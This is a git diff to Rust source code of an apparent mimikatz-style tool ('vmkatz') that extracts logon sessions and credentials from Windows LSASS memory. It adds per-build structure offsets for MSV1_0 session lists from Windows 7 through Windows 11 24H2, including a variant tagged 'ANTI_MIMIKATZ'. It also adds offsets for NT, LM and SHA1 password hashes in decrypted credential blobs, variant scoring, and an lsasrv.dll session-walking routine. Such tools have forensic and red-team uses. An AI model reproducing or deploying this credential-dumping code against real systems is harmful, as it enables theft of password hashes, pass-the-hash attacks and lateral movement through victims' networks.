@@ -1,18 +1,25 @@
-use crate::error::Result;
-use crate::lsass::crypto::CryptoKeys;
+use crate::error::{VmkatzError, Result};
+use crate::lsass::crypto::{CryptoKeys, PreVistaCryptoKeys};
 use crate::lsass::patterns;
-use crate::lsass::types::MsvCredential;
+use crate::lsass::types::{Arch, MsvCredential, read_ptr, read_ustring, is_valid_user_ptr};
 use crate::memory::VirtualMemory;
 use crate::pe::parser::PeHeaders;
 
-/// MSV1_0 list entry offsets (Windows 10 x64).
-/// These offsets are within the MSV1_0_LIST_ENTRY structure.
+/// MSV1_0 list entry offsets per Windows build variant.
 struct MsvOffsets {
     flink: u64,
     luid: u64,
     username: u64,
     domain: u64,
     credentials_ptr: u64,
+    // Session metadata offsets (0 = field not available in this variant)
+    logon_type: u64,
+    session_id: u64,
+    logon_time: u64,
+    logon_server: u64,
+    sid: u64,
+    /// true = SID embedded inline, false = SID via pointer
+    sid_embedded: bool,
 }
 
 /// Session metadata discovered during MSV list walk (returned even when creds are paged).
@@ -27,104 +34,134 @@ pub struct MsvSessionInfo {
     pub sid: String,
 }
 
-// Multiple MSV1_0_LIST variants to try (depends on exact Windows 10 build).
-// Offsets differ significantly between builds.
+// Multiple MSV1_0_LIST variants to try (depends on exact Windows build).
 // credentials_ptr = 0 means "auto-detect by scanning for Primary signature".
 const MSV_OFFSET_VARIANTS: &[MsvOffsets] = &[
     // Variant 0: Empirical NlpActiveLogonTable (Win10 19041+/22H2)
+    // Not a KIWI_MSV1_0_LIST — different structure, empirically determined.
+    // LogonTime not available in this structure (confirmed by hex dump analysis).
     MsvOffsets {
         flink: 0x00,
         luid: 0x2C,
         username: 0x48,
         domain: 0x58,
         credentials_ptr: 0,
+        logon_type: 0x34,
+        session_id: 0x38,
+        logon_time: 0, // Not stored in NlpActiveLogon
+        logon_server: 0x68,
+        sid: 0x88,
+        sid_embedded: true,
     },
-    // Variant 1: MSV1_0_LIST_63 base (Win10 1507-1511)
-    MsvOffsets {
-        flink: 0x00,
-        luid: 0x70,
-        username: 0x80,
-        domain: 0x90,
-        credentials_ptr: 0xE8,
-    },
-    // Variant 2: MSV1_0_LIST_63 extended (Win10 1607+)
-    MsvOffsets {
-        flink: 0x00,
-        luid: 0x90,
-        username: 0xA8,
-        domain: 0xB8,
-        credentials_ptr: 0x108,
-    },
-    // Variant 3: MSV1_0_LIST_62 (Win8/8.1 / Server 2012/2012R2)
+    // Variant 1: LIST_63 (Win10 10240-26099, Win8.1 w/ AM patch)
     MsvOffsets {
         flink: 0x00,
         luid: 0x70,
         username: 0x90,
         domain: 0xA0,
-        credentials_ptr: 0xF8,
+        credentials_ptr: 0x108,
+        logon_type: 0xD8,
+        session_id: 0xE8,
+        logon_time: 0xF0,
+        logon_server: 0xF8,
+        sid: 0xD0,
+        sid_embedded: false,
     },
-    // Variant 4: MSV1_0_LIST_61 (Win7 / Server 2008 R2)
+    // Variant 2: LIST_62 (Win8/8.1 / Server 2012/2012R2, without AM patch)
     MsvOffsets {
         flink: 0x00,
-        luid: 0x30,
-        username: 0x40,
-        domain: 0x50,
-        credentials_ptr: 0xA0,
+        luid: 0x70,
+        username: 0x80,
+        domain: 0x90,
+        credentials_ptr: 0xF8,
+        logon_type: 0xC8,
+        session_id: 0xD8,
+        logon_time: 0xE0,
+        logon_server: 0xE8,
+        sid: 0xC0,
+        sid_embedded: false,
+    },
+    // Variant 3: LIST_60 (Win7 / Vista / Server 2008 R2)
+    MsvOffsets {
+        flink: 0x00,
+        luid: 0x70,
+        username: 0x80,
+        domain: 0x90,
+        credentials_ptr: 0xD8,
+        logon_type: 0xB8,
+        session_id: 0xBC,
+        logon_time: 0xC0,
+        logon_server: 0xC8,
+        sid: 0xB0,
+        sid_embedded: false,
+    },
+    // Variant 4: LIST_61_ANTI_MIMIKATZ (Win7 w/ newer msv1_0.dll, timestamp > 0x53480000)
+    MsvOffsets {
+        flink: 0x00,
+        luid: 0x70,
+        username: 0x90,
+        domain: 0xA0,
+        credentials_ptr: 0xE8,
+        logon_type: 0xC8,
+        session_id: 0xCC,
+        logon_time: 0xD0,
+        logon_server: 0xD8,
+        sid: 0xC0,
+        sid_embedded: false,
+    },
+    // Variant 5: LIST_64 (Win11 24H2 early builds)
+    MsvOffsets {
+        flink: 0x00,
+        luid: 0x70,
+        username: 0x98,
+        domain: 0xA8,
+        credentials_ptr: 0x110,
+        logon_type: 0xE0,
+        session_id: 0xF0,
+        logon_time: 0xF8,
+        logon_server: 0x100,
+        sid: 0xD8,
+        sid_embedded: false,
+    },
+    // Variant 6: LIST_65 (Win11 24H2 newer builds)
+    MsvOffsets {
+        flink: 0x00,
+        luid: 0x70,
+        username: 0xA0,
+        domain: 0xB0,
+        credentials_ptr: 0x118,
+        logon_type: 0xE8,
+        session_id: 0xF8,
+        logon_time: 0x100,
+        logon_server: 0x108,
+        sid: 0xE0,
+        sid_embedded: false,
     },
 ];
 
 /// Primary credential offsets within MSV1_0_PRIMARY_CREDENTIAL.
-struct PrimaryCredOffsets {
-    lm_hash: u64,
-    nt_hash: u64,
-    sha1_hash: u64,
+pub(crate) struct PrimaryCredOffsets {
+    pub(crate) lm_hash: usize,
+    pub(crate) nt_hash: usize,
+    pub(crate) sha1_hash: usize,
 }
 
-// MSV1_0_PRIMARY_CREDENTIAL offsets (decrypted blob).
-// Multiple offset sets for different Windows builds.
-// Ordered by likelihood — canonical mimikatz structures first, empirical fallbacks last.
-//
-// KIWI_MSV1_0_PRIMARY_CREDENTIAL_10_1607 (Win10 1607+ / Win11):
-//   +0x00: LogonDomainName (UNICODE_STRING, 16B)
-//   +0x10: UserName (UNICODE_STRING, 16B)
-//   +0x20: pNtlmCredIsoInProc (PTR, 8B)
-//   +0x28: isIso(1) isNtOwf(1) isLmOwf(1) isShaOwf(1) isDPAPIProtected(1) align(3)
-//   +0x30: unk0 (DWORD), +0x34: unk1 (WORD)
-//   +0x36: NtOwfPassword(16), +0x46: LmOwfPassword(16), +0x56: ShaOwPassword(20)
-const PRIMARY_CRED_OFFSET_VARIANTS: &[PrimaryCredOffsets] = &[
-    // Variant 0: Win10 1607+ / Win11 (KIWI_MSV1_0_PRIMARY_CREDENTIAL_10_1607)
-    // Canonical mimikatz layout: unk0(4)+unk1(2) before hashes
-    PrimaryCredOffsets {
-        nt_hash: 0x36,
-        lm_hash: 0x46,
-        sha1_hash: 0x56,
-    },
-    // Variant 1: Win10 1507/1511 (KIWI_MSV1_0_PRIMARY_CREDENTIAL_10_OLD)
-    // isIso(1)+isNtOwf(1)+isLmOwf(1)+isSha(1)+align(4) = 8 bytes at +0x20 → hashes at +0x28
-    PrimaryCredOffsets {
-        nt_hash: 0x28,
-        lm_hash: 0x38,
-        sha1_hash: 0x48,
-    },
-    // Variant 2: Win7 SP1 / Win8 / Win8.1 / Server 2008R2-2012R2
-    // No isIso, no DPAPIProtected. Hashes directly after UserName.
-    PrimaryCredOffsets {
-        nt_hash: 0x20,
-        lm_hash: 0x30,
-        sha1_hash: 0x40,
-    },
-    // Variant 3: Win10 1607+ without unk0/unk1 (some builds or Credential Guard configs)
-    PrimaryCredOffsets {
-        nt_hash: 0x30,
-        lm_hash: 0x40,
-        sha1_hash: 0x50,
-    },
-    // Variant 4: Empirical — observed on ESXi Win10 NAS and some Server 2016 VMs.
-    // Structure may have extra fields or different alignment.
+// MSV1_0_PRIMARY_CREDENTIAL offsets within the decrypted blob.
+// Ordered by likelihood — canonical layouts first, empirical fallbacks last.
+pub(crate) const PRIMARY_CRED_OFFSET_VARIANTS: &[PrimaryCredOffsets] = &[
+    // Win10 1607+ / Win11
+    PrimaryCredOffsets { nt_hash: 0x36, lm_hash: 0x46, sha1_hash: 0x56 },
+    // Win10 1507/1511
+    PrimaryCredOffsets { nt_hash: 0x28, lm_hash: 0x38, sha1_hash: 0x48 },
+    // Win7/8/8.1
+    PrimaryCredOffsets { nt_hash: 0x20, lm_hash: 0x30, sha1_hash: 0x40 },
+    // Win10 1607+ (Credential Guard variant)
+    PrimaryCredOffsets { nt_hash: 0x30, lm_hash: 0x40, sha1_hash: 0x50 },
+    // Win10 1607+ DPAPI-shifted (ShaOwPassword before NtOwf)
     PrimaryCredOffsets {
         nt_hash: 0x4A,
         lm_hash: 0x5A,
-        sha1_hash: 0x6A,
+        sha1_hash: 0x36,
     },
     // Variant 5: Empirical — slight alignment variation of variant 4.
     PrimaryCredOffsets {
@@ -132,14 +169,65 @@ const PRIMARY_CRED_OFFSET_VARIANTS: &[PrimaryCredOffsets] = &[
         lm_hash: 0x5C,
         sha1_hash: 0x6C,
     },
+    // Variant 6: Win11 24H2+ (credKeyType DWORD removed, hashes shift -4 vs DPAPI layout)
+    PrimaryCredOffsets {
+        nt_hash: 0x46,
+        lm_hash: 0x56,
+        sha1_hash: 0x66,
+    },
 ];
+
+/// Build-number-aware variant priority ordering.
+/// Returns indices into `MSV_OFFSET_VARIANTS` ordered by likelihood for the given build.
+/// Variant indices:
+///   0 = NlpActiveLogon (Win10 19041+)
+///   1 = LIST_63 (Win10 all, Win8.1 AM)
+///   2 = LIST_62 (Win8/8.1)
+///   3 = LIST_61 (Win7/Vista)
+///   4 = LIST_61_AM (Win7 AM)
+///   5 = LIST_64 (Win11 24H2 early)
+///   6 = LIST_65 (Win11 24H2 newer)
+fn variant_order_for_build(build: u32) -> Vec<usize> {
+    match build {
+        26100.. => vec![5, 6, 1, 0, 2, 3, 4],  // Win11 24H2+: LIST_64, LIST_65, then LIST_63
+        19041.. => vec![0, 1, 2, 3, 4, 5, 6],   // Win10 19041+: NlpActiveLogon, then LIST_63
+        10240.. => vec![1, 0, 2, 3, 4, 5, 6],   // Win10 1507-1903: LIST_63 first
+        9200..  => vec![2, 1, 3, 4, 0, 5, 6],   // Win8/8.1: LIST_62, then LIST_63 (AM patch)
+        7600..  => vec![3, 4, 2, 1, 0, 5, 6],   // Win7/Vista: LIST_61, then LIST_61_AM
+        _       => vec![0, 1, 2, 3, 4, 5, 6],   // Unknown
+    }
+}
+
+/// Score a variant's extraction quality for a set of sessions.
+/// Higher = more likely correct variant. Prevents false positives from variants
+/// that find garbled data with unicode-looking strings.
+fn score_variant_sessions(sessions: &std::collections::HashMap<u64, MsvSessionInfo>) -> u32 {
+    let mut score = 0u32;
+    for s in sessions.values() {
+        if !s.username.is_empty() {
+            score += 10;
+        }
+        if s.logon_time != 0 {
+            score += 5;
+        }
+        if !s.domain.is_empty() {
+            score += 3;
+        }
+        if !s.sid.is_empty() {
+            score += 2;
+        }
+    }
+    score
+}
 
 /// Extract MSV1_0 sessions (always) and credentials (when available) from msv1_0.dll.
 /// Returns sessions even when credentials are paged out.
-pub fn extract_msv_sessions(
-    vmem: &impl VirtualMemory,
+/// `build_number` enables build-aware variant prioritization (0 = unknown).
+fn extract_msv_sessions(
+    vmem: &dyn VirtualMemory,
     msv_base: u64,
     msv_size: u32,
+    build_number: u32,
 ) -> Vec<MsvSessionInfo> {
     let pe = match PeHeaders::parse_from_memory(vmem, msv_base) {
         Ok(p) => p,
@@ -173,7 +261,16 @@ pub fn extract_msv_sessions(
     // Use HashMap to allow metadata enrichment when a session is re-discovered
     // by a variant with richer metadata (e.g. variant 2 has logon_time, variant 0 doesn't).
     let mut session_map: std::collections::HashMap<u64, MsvSessionInfo> =
-        std::collections::HashMap::new();
+        std::collections::HashMap::with_capacity(bucket_count);
+
+    // Build-aware variant ordering: try top-3 prioritized variants first,
+    // score each by metadata richness, then pick the best one
+    let variant_order = variant_order_for_build(build_number);
+    log::info!(
+        "MSV session discovery: build={}, variant order={:?}",
+        build_number,
+        variant_order
+    );
 
     // Walk all buckets of the pattern-resolved hash table
     if let Some(base) = list_base {
@@ -182,28 +279,66 @@ pub fn extract_msv_sessions(
             base,
             bucket_count
         );
-        for offsets in MSV_OFFSET_VARIANTS {
-            let pre = session_map.len();
-            walk_session_buckets(vmem, base, bucket_count, offsets, &mut session_map);
-            if session_map.len() > pre {
-                log::info!(
-                    "MSV sessions: variant luid=0x{:x} found {} sessions across {} buckets",
-                    offsets.luid,
-                    session_map.len() - pre,
-                    bucket_count
-                );
-                break;
+
+        // Try top-3 prioritized variants, score each
+        let mut best_map: Option<std::collections::HashMap<u64, MsvSessionInfo>> = None;
+        let mut best_score = 0u32;
+        let mut best_variant_idx = 0;
+
+        let top_n = variant_order.len().min(3);
+        for &vi in &variant_order[..top_n] {
+            let offsets = &MSV_OFFSET_VARIANTS[vi];
+            let mut trial_map: std::collections::HashMap<u64, MsvSessionInfo> =
+                std::collections::HashMap::with_capacity(bucket_count);
+            walk_session_buckets(vmem, base, bucket_count, offsets, &mut trial_map);
+            let score = score_variant_sessions(&trial_map);
+            log::info!(
+                "MSV variant {} (luid=0x{:x}): {} sessions, score={}",
+                vi, offsets.luid, trial_map.len(), score
+            );
+            if score > best_score {
+                best_score = score;
+                best_map = Some(trial_map);
+                best_variant_idx = vi;
             }
+        }
+
+        // If top-3 all scored 0, try remaining variants
+        if best_score == 0 {
+            for &vi in &variant_order[top_n..] {
+                let offsets = &MSV_OFFSET_VARIANTS[vi];
+                let mut trial_map: std::collections::HashMap<u64, MsvSessionInfo> =
+                    std::collections::HashMap::new();
+                walk_session_buckets(vmem, base, bucket_count, offsets, &mut trial_map);
+                let score = score_variant_sessions(&trial_map);
+                if score > best_score {
+                    best_score = score;
+                    best_map = Some(trial_map);
+                    best_variant_idx = vi;
+                }
+            }
+        }
+
+        if let Some(map) = best_map {
+            log::info!(
+                "MSV sessions: best variant {} (luid=0x{:x}), {} sessions, score={}",
+                best_variant_idx,
+                MSV_OFFSET_VARIANTS[best_variant_idx].luid,
+                map.len(),
+                best_score
+            );
+            session_map = map;
         }
     }
 
     // Also try .data scan candidates (single list heads) if pattern didn't find enough
     if session_map.len() < 3 {
         let list_addrs =
-            find_all_logon_session_list_candidates(vmem, &pe, msv_base).unwrap_or_default();
+            find_all_logon_session_list_candidates(vmem, &pe, msv_base, Arch::X64).unwrap_or_default();
 
         for list_addr in &list_addrs {
-            for offsets in MSV_OFFSET_VARIANTS {
+            for &vi in &variant_order {
+                let offsets = &MSV_OFFSET_VARIANTS[vi];
                 let pre = session_map.len();
                 walk_session_list(vmem, *list_addr, offsets, &mut session_map);
                 if session_map.len() > pre {
@@ -213,28 +348,50 @@ pub fn extract_msv_sessions(
         }
     }
 
-    // Always try ALL hash tables with ALL variants to enrich session metadata.
-    // Different tables hold different entries with different variants, and variants
-    // with higher offsets (e.g. luid=0x90) provide richer metadata (logon_time, SID).
+    // Phase 2: Enrich session metadata by re-walking ALL tables/lists with ALL variants.
+    //
+    // Why walk again with ALL variants? The credential extraction phase (above) stops at
+    // the first variant that yields credentials. But session metadata (LogonTime, SID,
+    // LogonServer) may exist in a DIFFERENT structure or require a different variant:
+    //   - Win10 19041+: credentials come from NlpActiveLogon (variant 0, no LogonTime),
+    //     but LogonTime lives in a separate LogonSessionList (LIST_63, variant 1).
+    //   - The hash table may use one variant while single-list candidates use another.
+    // By re-walking everything with every variant, merge_session() fills in any missing
+    // metadata fields from whichever variant/structure has them.
     {
-        let pre_count = session_map.len();
+        let pre_logon_times: usize = session_map.values().filter(|s| s.logon_time != 0).count();
+
+        // Re-walk the pattern-resolved hash table with ALL variants (not just the winner)
+        if let Some(base) = list_base {
+            for offsets in MSV_OFFSET_VARIANTS {
+                walk_session_buckets(vmem, base, bucket_count, offsets, &mut session_map);
+            }
+        }
+
+        // Walk inline hash tables with ALL variants
         if let Ok(tables) = find_inline_hash_table(vmem, &pe, msv_base) {
-            for (table_addr, bucket_count) in &tables {
+            for (table_addr, count) in &tables {
                 for offsets in MSV_OFFSET_VARIANTS {
-                    walk_session_buckets(
-                        vmem,
-                        *table_addr,
-                        *bucket_count,
-                        offsets,
-                        &mut session_map,
-                    );
+                    walk_session_buckets(vmem, *table_addr, *count, offsets, &mut session_map);
                 }
             }
         }
-        if session_map.len() > pre_count {
+
+        // Walk .data scan candidates (linked lists) with ALL variants.
+        // This covers LogonSessionList heads not found by the hash table scanner.
+        let all_candidates =
+            find_all_logon_session_list_candidates(vmem, &pe, msv_base, Arch::X64).unwrap_or_default();
+        for list_addr in &all_candidates {
+            for offsets in MSV_OFFSET_VARIANTS {
+                walk_session_list(vmem, *list_addr, offsets, &mut session_map);
+            }
+        }
+
+        let post_logon_times: usize = session_map.values().filter(|s| s.logon_time != 0).count();
+        if post_logon_times > pre_logon_times {
             log::info!(
-                "Hash table walk found {} additional sessions",
-                session_map.len() - pre_count
+                "Enrichment: logon_time populated {} → {} sessions",
+                pre_logon_times, post_logon_times
             );
         }
     }
@@ -242,16 +399,153 @@ pub fn extract_msv_sessions(
     session_map.into_values().collect()
 }
 
+/// Enrich existing sessions with metadata from lsasrv.dll's LogonSessionList.
+/// On Win10 19041+, msv1_0.dll uses NlpActiveLogon entries (no LogonTime).
+/// lsasrv.dll maintains a separate LogonSessionList with LIST_63 entries that
+/// contain LogonTime, LogonServer, SID, etc. This function scans lsasrv.dll's
+/// .data section for these entries and merges their metadata into sessions.
+pub fn enrich_sessions_from_lsasrv(
+    vmem: &dyn VirtualMemory,
+    lsasrv_base: u64,
+    lsasrv_size: u32,
+    sessions: &mut [MsvSessionInfo],
+    arch: Arch,
+) {
+    let pe = match PeHeaders::parse_from_memory(vmem, lsasrv_base) {
+        Ok(p) => p,
+        Err(_) => return,
+    };
+
+    // Select LIST_63+ variants for the right architecture
+    // x64: luid=0x70, x86: luid=0x3C
+    let list63_luid = if arch == Arch::X64 { 0x70u64 } else { 0x3Cu64 };
+    let variants_src = if arch == Arch::X64 { MSV_OFFSET_VARIANTS } else { MSV_OFFSET_VARIANTS_X86 };
+    let lsasrv_variants: Vec<&MsvOffsets> = variants_src.iter()
+        .filter(|o| o.luid == list63_luid)
+        .collect();
+
+    let _ = lsasrv_size; // Size used implicitly via PE parse
+
+    // Build a lookup map: LUID → index into sessions slice
+    let mut luid_map: std::collections::HashMap<u64, usize> = std::collections::HashMap::new();
+    for (i, s) in sessions.iter().enumerate() {
+        luid_map.entry(s.luid).or_insert(i);
+    }
+
+    // Scan lsasrv .data section for LIST_ENTRY candidates
+    let candidates = find_all_logon_session_list_candidates(vmem, &pe, lsasrv_base, arch)
+        .unwrap_or_default();
+
+    if candidates.is_empty() {
+        return;
+    }
+
+    log::info!(
+        "lsasrv enrichment: {} .data candidates, {} variants, arch={:?}",
+        candidates.len(), lsasrv_variants.len(), arch
+    );
+
+    // Walk each candidate with each LIST variant, looking for sessions that match known LUIDs
+    let mut enriched = 0usize;
+    for list_addr in &candidates {
+        for &offsets in &lsasrv_variants {
+            let head_flink = match read_ptr(vmem, *list_addr, arch) {
+                Ok(f) => f,
+                Err(_) => continue,
+            };
+            if head_flink == 0 || head_flink == *list_addr {
+                continue;
+            }
+
+            let mut current = head_flink;
+            let mut visited = CycleDetector::new();
+
+            for _ in 0..256 {
+                if current == *list_addr || visited.contains(current) || current == 0 {
+                    break;
+                }
+                visited.insert(current);
+
+                let luid = vmem.read_virt_u64(current + offsets.luid).unwrap_or(0);
+
+                // Only process LUIDs that match known sessions
+                if let Some(&idx) = luid_map.get(&luid) {
+                    let (logon_type, session_id, logon_time, logon_server, sid) =
+                        extract_session_metadata(vmem, current, offsets, arch);
+
+                    let s = &mut sessions[idx];
+                    if s.logon_time == 0 && logon_time != 0 {
+                        s.logon_time = logon_time;
+                        enriched += 1;
+                    }
+                    if s.logon_type == 0 && logon_type != 0 {
+                        s.logon_type = logon_type;
+                    }
+                    if s.session_id == 0 && session_id != 0 {
+                        s.session_id = session_id;
+                    }
+                    if s.sid.is_empty() && !sid.is_empty() {
+                        s.sid = sid;
+                    }
+                    if s.logon_server.is_empty() && !logon_server.is_empty() {
+                        s.logon_server = logon_server;
+                    }
+                }
+
+                current = match read_ptr(vmem, current + offsets.flink, arch) {
+                    Ok(f) => f,
+                    Err(_) => break,
+                };
+            }
+        }
+    }
+
+    if enriched > 0 {
+        log::info!("lsasrv enrichment: populated logon_time for {} sessions", enriched);
+    }
+}
+
+/// Fixed-capacity cycle detector for linked-list walks.
+/// Replaces HashSet<u64> to avoid heap allocation — the max iteration count is
+/// bounded at 256, so a stack array is sufficient.
+struct CycleDetector {
+    addrs: [u64; 256],
+    len: usize,
+}
+
+impl CycleDetector {
+    fn new() -> Self {
+        Self {
+            addrs: [0; 256],
+            len: 0,
+        }
+    }
+
+    /// Returns `true` if `addr` was already visited.
+    fn contains(&self, addr: u64) -> bool {
+        self.addrs[..self.len].contains(&addr)
+    }
+
+    /// Records `addr` as visited. Caller must ensure at most 256 insertions.
+    fn insert(&mut self, addr: u64) {
+        debug_assert!(self.len < 256);
+        self.addrs[self.len] = addr;
+        self.len += 1;
+    }
+}
+
 /// Walk a hash table (array of LIST_ENTRY buckets) and insert/merge sessions.
 fn walk_session_buckets(
-    vmem: &impl VirtualMemory,
+    vmem: &dyn VirtualMemory,
     base: u64,
     bucket_count: usize,
     offsets: &MsvOffsets,
     session_map: &mut std::collections::HashMap<u64, MsvSessionInfo>,
 ) {
+    // Each hash bucket is a LIST_ENTRY (2 pointers = 16 bytes on x64)
+    const HASH_BUCKET_SIZE: u64 = 16;
     for bucket_idx in 0..bucket_count {
-        let bucket_addr = base + (bucket_idx as u64) * 16;
+        let bucket_addr = base + (bucket_idx as u64) * HASH_BUCKET_SIZE;
         let head_flink = match vmem.read_virt_u64(bucket_addr) {
             Ok(f) => f,
             Err(_) => continue,
@@ -261,10 +555,10 @@ fn walk_session_buckets(
         }
 
         let mut current = head_flink;
-        let mut visited = std::collections::HashSet::new();
+        let mut visited = CycleDetector::new();
 
         for _ in 0..256 {
-            if current == bucket_addr || visited.contains(&current) || current == 0 {
+            if current == bucket_addr || visited.contains(current) || current == 0 {
                 break;
             }
             visited.insert(current);
@@ -279,7 +573,7 @@ fn walk_session_buckets(
 
             if is_plausible_luid(luid) && is_plausible_username(&username) {
                 let (logon_type, session_id, logon_time, logon_server, sid) =
-                    extract_session_metadata(vmem, current, offsets);
+                    extract_session_metadata(vmem, current, offsets, Arch::X64);
                 let info = MsvSessionInfo {
                     luid,
                     username,
@@ -303,7 +597,7 @@ fn walk_session_buckets(
 
 /// Walk a single linked list and insert/merge sessions.
 fn walk_session_list(
-    vmem: &impl VirtualMemory,
+    vmem: &dyn VirtualMemory,
     list_addr: u64,
     offsets: &MsvOffsets,
     session_map: &mut std::collections::HashMap<u64, MsvSessionInfo>,
@@ -317,10 +611,10 @@ fn walk_session_list(
     }
 
     let mut current = head_flink;
-    let mut visited = std::collections::HashSet::new();
+    let mut visited = CycleDetector::new();
 
     for _ in 0..256 {
-        if current == list_addr || visited.contains(&current) || current == 0 {
+        if current == list_addr || visited.contains(current) || current == 0 {
             break;
         }
         visited.insert(current);
@@ -335,7 +629,7 @@ fn walk_session_list(
 
         if is_plausible_luid(luid) && is_plausible_username(&username) {
             let (logon_type, session_id, logon_time, logon_server, sid) =
-                extract_session_metadata(vmem, current, offsets);
+                extract_session_metadata(vmem, current, offsets, Arch::X64);
             let info = MsvSessionInfo {
                 luid,
                 username,
@@ -367,7 +661,7 @@ fn is_plausible_luid(luid: u64) -> bool {
 
 /// Validate that a session username looks plausible (not garbage memory).
 /// Rejects strings with control characters, backslashes (file paths),
-/// or non-ASCII outside the BMP common range.
+/// or private-use/surrogate codepoints.
 fn is_plausible_username(name: &str) -> bool {
     if name.is_empty() || name.len() > 256 {
         return false;
@@ -376,12 +670,12 @@ fn is_plausible_username(name: &str) -> bool {
     if name.contains('\\') || name.contains('/') {
         return false;
     }
-    // Reject strings with control characters (except space) or null bytes
+    // Reject strings with control characters (except space/tab) or null bytes
     if name.chars().any(|c| c < ' ' && c != '\t') {
         return false;
     }
-    // Require at least one ASCII alphanumeric character — real usernames have one
-    name.chars().any(|c| c.is_ascii_alphanumeric() || c == '$' || c == '-')
+    // Require at least one alphanumeric character (any script: Latin, CJK, Cyrillic, etc.)
+    name.chars().any(|c| c.is_alphanumeric() || c == '$' || c == '-')
 }
 
 /// Insert or merge a session into the map. When re-discovering a LUID,
@@ -413,135 +707,87 @@ fn merge_session(map: &mut std::collections::HashMap<u64, MsvSessionInfo>, new: 
     }
 }
 
-/// Extract session metadata from an MSV list entry.
+/// Extract session metadata from an MSV list entry using per-variant offsets.
 fn extract_session_metadata(
-    vmem: &impl VirtualMemory,
+    vmem: &dyn VirtualMemory,
     entry_addr: u64,
     offsets: &MsvOffsets,
+    arch: Arch,
 ) -> (u32, u32, u64, String, String) {
-    let logon_type: u32;
-    let session_id: u32;
-    let logon_time: u64;
-    let logon_server: String;
-    let sid: String;
-
-    if offsets.luid == 0x2C {
-        // NlpActiveLogon layout (Win10 19041+/22H2):
-        //   +0x00: Flink/Blink (16B)
-        //   +0x2C: LUID (8B), +0x34: LogonType (4B), +0x38: field2 (4B)
-        //   +0x48: Username (UNICODE_STRING 16B), +0x58: Domain, +0x68: LogonServer
-        //   +0x88: SID embedded (not pointer)
-        // LogonTime not available in this structure variant.
-        logon_type = vmem.read_virt_u32(entry_addr + 0x34).unwrap_or(0);
-        session_id = vmem.read_virt_u32(entry_addr + 0x38).unwrap_or(0);
-        logon_time = 0; // Not stored in NlpActiveLogon
-        logon_server = vmem
-            .read_win_unicode_string(entry_addr + 0x68)
-            .unwrap_or_default();
-        sid = read_sid_embedded(vmem, entry_addr + 0x88);
-    } else if offsets.luid == 0x90 {
-        // MSV1_0_LIST_63 extended (Win10 1607+)
-        logon_type = vmem.read_virt_u32(entry_addr + 0x80).unwrap_or(0);
-        session_id = vmem.read_virt_u32(entry_addr + 0x84).unwrap_or(0);
-        logon_time = vmem.read_virt_u64(entry_addr + 0x88).unwrap_or(0);
-        logon_server = vmem
-            .read_win_unicode_string(entry_addr + 0xC8)
-            .unwrap_or_default();
-        sid = read_sid_string(vmem, entry_addr + 0x98);
-    } else if offsets.luid == 0x70 {
-        // MSV1_0_LIST_63 base / MSV1_0_LIST_62
-        logon_type = vmem.read_virt_u32(entry_addr + 0x60).unwrap_or(0);
-        session_id = vmem.read_virt_u32(entry_addr + 0x64).unwrap_or(0);
-        logon_time = vmem.read_virt_u64(entry_addr + 0x68).unwrap_or(0);
-        logon_server = vmem
-            .read_win_unicode_string(entry_addr + 0xA8)
-            .unwrap_or_default();
-        sid = read_sid_string(vmem, entry_addr + 0x78);
+    let logon_type = if offsets.logon_type != 0 {
+        vmem.read_virt_u32(entry_addr + offsets.logon_type).unwrap_or(0)
     } else {
-        // Win7 or unknown - minimal metadata
-        logon_type = 0;
-        session_id = 0;
-        logon_time = 0;
-        logon_server = String::new();
-        sid = String::new();
-    }
+        0
+    };
+
+    let session_id = if offsets.session_id != 0 {
+        vmem.read_virt_u32(entry_addr + offsets.session_id).unwrap_or(0)
+    } else {
+        0
+    };
+
+    let logon_time = if offsets.logon_time != 0 {
+        vmem.read_virt_u64(entry_addr + offsets.logon_time).unwrap_or(0)
+    } else {
+        0
+    };
+
+    let logon_server = if offsets.logon_server != 0 {
+        read_ustring(vmem, entry_addr + offsets.logon_server, arch)
+            .unwrap_or_default()
+    } else {
+        String::new()
+    };
+
+    let sid = if offsets.sid != 0 {
+        if offsets.sid_embedded {
+            read_sid_embedded(vmem, entry_addr + offsets.sid)
+        } else {
+            read_sid_string(vmem, entry_addr + offsets.sid, arch)
+        }
+    } else {
+        String::new()
+    };
 
     (logon_type, session_id, logon_time, logon_server, sid)
 }
 
 /// Read a SID from a pointer and format as "S-1-5-21-..."
-fn read_sid_string(vmem: &impl VirtualMemory, ptr_addr: u64) -> String {
-    let sid_ptr = match vmem.read_virt_u64(ptr_addr) {
-        Ok(p) if p > 0x10000 && (p >> 48) == 0 => p,
+fn read_sid_string(vmem: &dyn VirtualMemory, ptr_addr: u64, arch: Arch) -> String {
+    let sid_ptr = match read_ptr(vmem, ptr_addr, arch) {
+        Ok(p) if is_valid_user_ptr(p, arch) => p,
         _ => return String::new(),
     };
-    // SID structure: Revision(1) + SubAuthorityCount(1) + IdentifierAuthority(6) + SubAuthority(4*count)
-    let header = match vmem.read_virt_bytes(sid_ptr, 8) {
-        Ok(h) => h,
-        Err(_) => return String::new(),
-    };
-    let revision = header[0];
-    let sub_count = header[1] as usize;
-    if revision != 1 || sub_count == 0 || sub_count > 15 {
-        return String::new();
-    }
-    let authority = u64::from_be_bytes([
-        0, 0, header[2], header[3], header[4], header[5], header[6], header[7],
-    ]);
-    let sub_data = match vmem.read_virt_bytes(sid_ptr + 8, sub_count * 4) {
-        Ok(d) => d,
-        Err(_) => return String::new(),
-    };
-    let mut s = format!("S-{}-{}", revision, authority);
-    for i in 0..sub_count {
-        let sub = u32::from_le_bytes([
-            sub_data[i * 4],
-            sub_data[i * 4 + 1],
-            sub_data[i * 4 + 2],
-            sub_data[i * 4 + 3],
-        ]);
-        s.push_str(&format!("-{}", sub));
-    }
-    s
+    read_sid_at(vmem, sid_ptr)
 }
 
 /// Read a SID embedded directly in a structure (not via pointer).
-fn read_sid_embedded(vmem: &impl VirtualMemory, sid_addr: u64) -> String {
-    let header = match vmem.read_virt_bytes(sid_addr, 8) {
+fn read_sid_embedded(vmem: &dyn VirtualMemory, sid_addr: u64) -> String {
+    read_sid_at(vmem, sid_addr)
+}
+
+/// Read and format a SID at a given virtual address.
+fn read_sid_at(vmem: &dyn VirtualMemory, addr: u64) -> String {
+    let header = match vmem.read_virt_bytes(addr, 8) {
         Ok(h) => h,
         Err(_) => return String::new(),
     };
-    let revision = header[0];
     let sub_count = header[1] as usize;
-    if revision != 1 || sub_count == 0 || sub_count > 15 {
-        return String::new();
-    }
-    let authority = u64::from_be_bytes([
-        0, 0, header[2], header[3], header[4], header[5], header[6], header[7],
-    ]);
